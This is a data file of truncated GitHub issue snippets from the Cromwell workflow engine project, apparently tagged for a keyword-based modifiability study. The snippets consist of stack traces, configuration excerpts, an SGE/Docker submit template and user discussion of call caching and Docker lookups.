Modifiability,"uts; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }; }. http { }; }. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 SSD""; noAddress: false; preemptible: 0; zones: [""us-west1-a"", ""us-west1-b"", ""us-west1-c""]; }; }; }; }; }. ```. However, when I tried to run a WDL workflow test which used ""gcr.io/broad-cumulus/cellranger:6.1.1"" docker image, the execution failed with the following log:. ```; 2021-09-27 13:47:50,363 INFO - Running with database db.url = jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true; Skipping auto-registration; 2021-09-27 13:47:55,753 WARN - Skipping auto-registration; 2021-09-27 13:47:55,833 INFO - Running with database db.url = jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true; Skipping auto-registration; 2021-09-27 13:47:56,493 WARN - Skipping auto-registration; 2021-09-27 13:47:57,524 INFO - Reference disks feature for PAPIv2 backend is not configured.; 2021-09-27 13:47:58,075 INFO - Slf4jLogger started; 2021-09-27 13:47:58,470 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-69bdc1a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2021-09-27 13:47:58,845 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - Metadata summary refreshing every 1 second.; 2021-09-27 13:47:58,865 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - No metadata archiver defined in config; 2021-09-27 13:47:58,86",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:5180,rewrite,rewriteBatchedStatements,5180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,v86 GCPBATCH errors when have multiple zones in the config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7232:52,config,config,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7232,1,['config'],['config']
Modifiability,vYXBpL0FjdGlvbkJ1aWxkZXIuc2NhbGE=) | `82.4% <84.61%> (+20.5%)` | :arrow_up: |; | [.../scala/cromiam/webservice/EngineRouteSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-Q3JvbUlBTS9zcmMvbWFpbi9zY2FsYS9jcm9taWFtL3dlYnNlcnZpY2UvRW5naW5lUm91dGVTdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...expression/renaming/BinaryOperatorEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvbmV3LWJhc2Uvc3JjL21haW4vc2NhbGEvd2RsL3RyYW5zZm9ybXMvYmFzZS93ZGxvbTJ3b20vZXhwcmVzc2lvbi9yZW5hbWluZy9CaW5hcnlPcGVyYXRvckV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...l/services/womtool/models/WomTypeJsonSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21haW4vc2NhbGEvY3JvbXdlbGwvc2VydmljZXMvd29tdG9vbC9tb2RlbHMvV29tVHlwZUpzb25TdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...end/impl/sfs/config/CpuDeclarationValidation.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvc2ZzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9zZnMvY29uZmlnL0NwdURlY2xhcmF0aW9uVmFsaWRhdGlvbi5zY2FsYQ==) | `0% <0%> (-100%)` | :arrow_down: |; | [...aft2/src/main/scala/wdl/draft2/model/package.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL21vZGVsL2RyYWZ0Mi9zcmMvbWFpbi9zY2FsYS93ZGwvZHJhZnQyL21vZGVsL3BhY2thZ2Uuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...ool/src/main/scala/womtool/validate/Validate.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d29tdG9vbC9zcmMvbWFpbi9zY2FsYS93b210b29sL3ZhbGlkYXRlL1ZhbGlkYXRlLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...king/expression/files/BiscayneFileEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvc3JjL21haW4vc2NhbGEvd2RsL3RyY,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620:2333,config,config,2333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620,2,['config'],['config']
Modifiability,"va.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.Co",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1879,Config,ConfigParser,1879,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigParser']
Modifiability,va.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroun,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:1563,config,config,1563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,2,['config'],['config']
Modifiability,va:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2409,Config,ConfigFactory,2409,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigFactory']
Modifiability,va:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomG,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2572,Config,ConfigFactory,2572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigFactory']
Modifiability,val$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); 	at cats.Traverse$Ops.traverse(Traverse.scala:19); 	at cats.Traverse$Ops.traverse$(Traverse.scala:19); 	at cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); 	at cromwell.core.path.PathBuilderFactory$.instantiatePathBuilders(PathBuilderFactory.scala:23); 	at cromwell.engine.EngineFilesystems$.pathBuildersForWorkflow(EngineFilesystems.scala:27); 	at cromwell.engine.workflow.WorkflowActor$$anonfun$8.bruteForcePathBuilders$1(WorkflowActor.scala:432); 	at cromwell.engine.workflow.WorkflowActor$$anonfun$8.applyOrElse(WorkflowActor.scala:436); 	at cromwell.engine.workflow.WorkflowActor$$anonfun$8.applyOrElse(WorkflowActor.scala:407); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at akka.actor.FSM.$anonfun$handleTransition$1(FSM.scala:627); 	at akka.actor.FSM.$anonfun$handleTransition$1$adapted(FSM.scala:627); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at akka.actor.FSM.handleTransition(FSM.scala:627); 	at akka.actor.FSM.makeTransition(FSM.scala:709); 	at akka.actor.FSM.makeTransition$(FSM.scala:702); 	at cromwell.engine.workflow.WorkflowActor.makeTransition(WorkflowActor.scala:186); 	at akka.actor.FSM.applyState(FSM.scala:694); 	at akka.actor.FSM.applyState$(FSM.scala:692); 	at cromwell.engine.workflow.WorkflowActor.applyState(WorkflowActor.scala:186); 	at akka.actor.FSM.processEvent(FSM.scala:689); 	at akka.actor.FSM.processEvent$(FSM.scala:681); 	at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:186); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:820); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:802); 	at cromwell.engine.workflow.WorkflowActor.processEvent(WorkflowActor.scala:186); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:678); 	at akka.actor.FSM$$anonfun$receiv,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4916:2996,adapt,adapted,2996,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4916,1,['adapt'],['adapted']
Modifiability,"vate images which cannot take advantage of Cromwell's call caching feartures - this is blocking a major analysis workflow's migration to Cromwell. Given that JGI also has other Docker images which are non-public, it is only the first of what is likely to be many other production workflows that cannot be used with Cromwell, blocking our institutional goal of consolidating JGI analysis workflows on Cromwell as our workflow engine. . Changelog:. Added config option docker.perform-registry-lookup-if-digest-is-provided with default True (https://github.com/broadinstitute/cromwell/commit/e9965d8f9a385b289f15b23b3fb923ecb8c0ea38); Added logic to DockerConfiguration.scala to sendDockerRequest if performRegistryLookupIfDigestIsProvided is true, else just lookupKvsOrBuildDescriptorAndStop.; Motivation:. Cromwell only allows call-caching when a digest is provided.; The digest registry lookup fails because Cromwell isn't respecting the system proxy.; This disables call-caching, even though we've provided the digest.; From original PR:. This PR is based on a comment in the Slack, and ongoing conversation in How to configure proxies? (which stems from https://github.com/broadinstitute/cromwell/issues/5006). Essentially, I don't want Cromwell to lookup my container when I provide it as a digest, because if the request fails (because Cromwell isn't respecting the system proxy), I still want call-caching to work. The main reason Cromwell seems to want to lookup the external registry is for the docker size which gets logged to metadata and doesn't seem to be used again. Thanks @mcovarr for the initial feedback, and sorry it took so long to action your suggestions. I've moved this to an internal branch so tests run automatically (as suggested in the past). I've included some of your feedback (that the dockerSize is used in the Google Backends) to the reference.conf and the DockerConfiguration.scala. I haven't included it in the documentation, but it's documented in the reference.conf.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7114:1383,config,configure,1383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114,1,['config'],['configure']
Modifiability,"velop version of the documentation instead. Similarly, the 'Example Providers Folder' section of the [Configuration](https://cromwell.readthedocs.io/en/stable/Configuring/) page links to the `develop` branch:; > You can find a description of options and example stanzas in the [Cromwell Example Configuration](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf), along with backend provider examples in the [Example Providers Folder](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.example.backends).; 4. After seeing that a big perf bottleneck was Cromwell hashing files, I enabled all of the call caching options and also enabled `check-sibling-md5` so that it could use pre-computed hashes instead. To my surprise, this did nothing because it only works when the configured `actor-factory` is `cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory`! The documentation does **not** make that sufficiently clear:; - The `hashing-strategy` and `check-sibling-md5` options are listed under the `Local Filesystem` section (and configured under `config.filesystems.local.caching` which led me to believe they would work with any provider configured for local filesystem (e.g., TES). This is not the case, and they are in fact tied to the actor factory implementation and the only actor factory with support is `ConfigBackendLifecycleActorFactory` (as far as I could tell).; - The documentation does make mention of mention:; > When running a job on the **Config (Shared Filesystem) backend**, Cromwell provides some additional options in the backend's config section. However neither a Config nor a Shared Filesystem backend are mentionend in the documentation, although SFS is found under [Filesystems](https://cromwell.readthedocs.io/en/stable/filesystems/Filesystems/). Therefore, I think the docs need additional clarity on config concepts like provider and actor-factory vs what we are referring to at a high-level as a ""backend"" (",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4810:2325,Config,ConfigBackendLifecycleActorFactory,2325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4810,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config', 'configured']"
Modifiability,versableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at wdl4s.Task$$anonfun$instantiateCommand$1.apply(Task.scala:107); 	at wdl4s.Task$$anonfun$instantiateCommand$1.apply(Task.scala:107); 	at scala.util.Try$.apply(Try.scala:192); 	at wdl4s.Task.instantiateCommand(Task.scala:107); 	at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor$class.writeTaskScript(ConfigAsyncJobExecutionActor.scala:55); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor$class.processArgs(ConfigAsyncJobExecutionActor.scala:39); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.executeScript(SharedFileSystemAsyncJobExecutionActor.scala:220); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeScript(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$executeOrRecover$2.apply(SharedFileSystemAsyncJobExecutionActor.scala:192); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$executeOrRecover$2.apply(SharedFileSystemAsyncJobExecutionActor.scala:189); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.sfs.SharedFile,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1765:2617,config,config,2617,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1765,1,['config'],['config']
Modifiability,"version ：cromwell-47. Architecture: DOCKER SGE docker-mysql. cromwell server Intermittent appearance qsub：command not found , server To get it back online. The relevant portion of cromwell.conf：. default = ""SGE""; providers {; # Configure the SGE backend; SGE {. # Use the config backend factory; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; #root = ""/GeneCloud001/server/cr_server/cromwell-exe""; #dockerRoot = ""/GeneCloud001/server/cr_server/cromwell-exe""; #script-epilogue = ""chmod -R a+rw * && chmod -R a+rw * && sync""; # Limits the number of concurrent jobs; #concurrent-job-limit = 500; # Define runtime attributes for the SGE backend.; # memory_gb is a special runtime attribute. See the cromwell README for more info.; runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? sge_queue; String? sge_project; String docker = ""jycloud/base:latest""; String? mnt_db_dir ####数据库挂载目录; String? mnt_input_dir ####输入bam挂载目录; String? mnt_out_dir ####输出挂载目录; String docker_user = ""$EUID""; String num_proc = 1; String? task_queue; String? mount; """"""; submit-docker = """"""; /opt/gridengine/bin/lx-amd64/qsub \; -terse \; -V \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -l ${""vf="" + memory_gb + ""g""},p=${num_proc} \; -b y docker run --rm -v ${cwd}:${docker_cwd} --user 1002 -m ${(memory_gb + (memory_gb / 2 )) + ""G""} --cpus ${num_proc} -v ${mnt_db_dir}:${mnt_db_dir}:ro -v ${mnt_out_dir}:${mnt_out_dir} -v /mnt/cache/sentieon:/mnt/cache/sentieon ${mount} ${docker} /bin/bash ${docker_script}",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5334:228,Config,Configure,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5334,5,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'Configure', 'config']"
Modifiability,wdl4s not erroring when a scatter variable is missing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2699:34,variab,variable,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2699,1,['variab'],['variable']
Modifiability,wdl4s not erroring when an output variable is missing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2700:34,variab,variable,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2700,1,['variab'],['variable']
Modifiability,"we working on an HPC without root and network and I often get the following message, does this mean that my cache calls are failing.; we using the singularity method of task execution; ```; cromwell-system-akka.dispatchers.engine-dispatcher-27 WARN - BackendPreparationActor_for_bcfd9d26:UnmappedBamToAlignedBam.SamToFastqAndBwaMemAndMba:14:1 [UUID(bcfd9d26)]: Docker lookup failed; cala:35); ```. How do I set it up to enable caching calls?. ------------------------------------------------------------------------------------------; running file; ```; java -jar -Ddocker.hash-lookup.method=local -Ddocker.hash-lookup.enabled=true -Dwebservice.port=8088 -Dwebservice.interface=0.0.0.0 -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/cromwellslurmsingularitynew.conf ./cromwell-84.jar server. ```; config ; ```; # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell wi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:809,config,config,809,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['config'],['config']
Modifiability,"well-system-akka.dispatchers.backend-dispatcher-101 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,977 cromwell-system-akka.dispatchers.engine-dispatcher-57 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.engine-dispatcher-67 INFO - WorkflowManagerActor WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030 is in a terminal state: WorkflowSucceededState; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.io-dispatcher-10 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log to /8ee1f938-a92c-48df-a4cc-7a0683413547/workflow.logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,184 cromwell-system-akka.actor.default-dispatcher-154 INFO - Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/cromwell-service/SubWorkflowStoreActor#1592013866] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030#1939109793] was not delivered. [6] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'ak; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986:3890,config,configuration,3890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986,1,['config'],['configuration']
